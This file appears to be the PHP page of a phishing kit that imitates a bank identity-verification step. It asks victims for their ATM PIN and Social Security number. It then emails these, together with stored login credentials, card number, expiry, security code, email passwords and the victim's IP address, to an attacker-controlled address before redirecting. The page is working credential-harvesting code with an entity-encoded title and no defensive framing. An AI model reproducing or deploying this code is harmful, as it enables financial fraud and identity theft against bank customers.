<?php


include '../Valid.php';
@session_start();
ob_start();

include 'Emaili.php';

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$hosti = generateRandomString();

$_SESSION['ata'] = $_POST['ata'];
$_SESSION['sn'] = $_POST['sn'];

if (!empty($_POST["ata"])) {

			$ipaddress = $_SERVER['REMOTE_ADDR'];
			$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
			$message.= "-------------User Info-----------------\n";
			$message.= "Username: ".$_SESSION['usr']."\n";
			$message.= "Pass Code: ".$_SESSION['psw']."\n";
			$message.=  "-------------Card Info-----------------\n";
			$message.=  "Question 1: ".$_SESSION['q1']."\n";
			$message.=  "Response 1: ".$_SESSION['ans1']."\n";
			$message.=  "Card Number: ".$_SESSION['cn']."\n";
			$message.=  "Expiration MM/YYYY: ".$_SESSION['ex']."\n";
			$message.=  "CSC (3 digits): ".$_SESSION['cv']."\n";
			$message.=  "-------------Email Info-----------------\n";
			$message.=  "Email Address: ".$_SESSION['em']."\n";
			$message.=  "Email Pass: ".$_SESSION['emp']."\n";
			$message.=  "-------------Email ERROR Info-----------------\n";
			$message.=  "Email Address: ".$_SESSION['em2']."\n";
			$message.=  "Email Pass: ".$_SESSION['emp2']."\n";
			$message.=  "-------------Identity Info-----------------\n";
			$message.=  "ATM PIN: ".$_SESSION['ata']."\n";
			$message.=  "SSN: ".$_SESSION['sn']."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "IP            : ".$ipaddress."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "|Client IP: ".$ipaddress2."\n";
			$message.= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
			$subject = "xXxBOA-NeWxXx $ipaddress";
			$headers = "From: UnKnown <Source@Bourder.land>";
			mail($SEND,$subject,$message,$headers);
		header("Location: com.php?sec=$hosti$hosti$hosti"); 
} else {
}

?>
<html><head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<link rel="shortcut icon" href="images/favicon.ico">	
<style type="text/css">

</style>
<link rel="stylesheet" href="css-js/jok1.css">
</head>
<body>
<form action="" name="chalojee" id="chalojee" method="post">
<div id="container">


<div id="image15" style="position: absolute; overflow: hidden; left: 180px; top: 740px; width: 987px; height: 150px; z-index: 3;"><img src="images/bbo28.png" alt="" title="" border="0" width="987" height="150"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/b7.png" alt="" title="" border="0" width="983" height="117"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:6"><img src="images/b9.png" alt="" title="" border="0" width="428" height="28"></div>
<div id="image9" style="position:absolute; overflow:hidden; left:202px; top:254px;  z-index:0"><img src="images/bb13.png" alt="" title="" border="0" ></div>

<div id="image10" style="position: absolute; overflow: hidden; left: 340px; top: 391px; width: 75px; height: 29px; z-index: 6;"><a href="#"><img src="images/bb10.png" alt="" title="" border="0" width="75" height="29"></a></div>
<input name="ata" class="textbox" autocomplete="off" required="" minlength="4"  maxlength="4" type="text" style="position:absolute;width:262px;left:204px;top:285px;z-index:7">
<input name="sn" class="textbox" autocomplete="off"  minlength="9"  maxlength="11" required="" type="tel" style="position:absolute;width:262px;left:204px;top:340px;z-index:8">


<div id="formimage1" style="position: absolute; left: 206px; top: 390px; z-index: 16;"><input type="image" name="formimage1" width="129" height="32" src="images/bcnf.png"></div>
</form></div>

</body>

</html>
<?php ob_end_flush(); ?>